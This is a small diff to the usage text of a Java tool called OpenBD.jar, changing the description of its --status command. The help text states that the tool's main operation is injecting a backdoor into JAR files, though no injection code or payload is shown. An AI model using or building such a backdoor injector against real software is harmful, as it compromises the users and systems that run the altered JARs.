@@ -5,7 +5,7 @@ Usage: java -jar OpenBD.jar <command> [options]
 Commands:
   --inject                  Inject the backdoor into JAR files. This is the main operation.
   --generate-config <path>  Generates a default 'config.json' file at the specified path.
-  --status                  Checks the status (placeholder).
+  --status                  Checks the status (patched).
   --help, -h                Shows this help message.
 
 Options for --inject:
